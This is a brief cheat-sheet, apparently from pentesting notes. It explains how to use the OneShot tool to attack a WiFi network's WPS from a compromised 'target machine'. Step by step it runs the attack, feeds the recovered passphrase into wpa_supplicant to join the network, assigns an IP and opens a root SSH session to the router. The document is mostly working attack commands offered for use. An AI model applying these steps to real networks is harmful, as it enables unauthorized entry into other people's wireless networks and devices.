# OneShot, perform WiFi attacks even if the WiFi interface is not on monitor mode

## Github repo: https://github.com/nikita-yfh/OneShot-C

### Usage:

#### 1) Compile the .c program as per the instructions in the repo, then transfer it to target machine.

#### 2) Run the program to perform WiFi attacks:

 - ./oneshot -i wlan0 -K (Scan for the BSSID of the interface, then type a number to choose your target)

 - wpa_passphrase AP_SSID 'WPA_PSK_PASSWORD' > psk (Put all necessary credentials in one file)

 - wpa_supplicant -B -c psk -i wlan0

 - ifconfig wlan0 192.168.1.5 netmask 255.255.255.0 (Assign IP to interface. You may assign any IP you want to the specific interface)

 - ssh root@192.168.1.1 
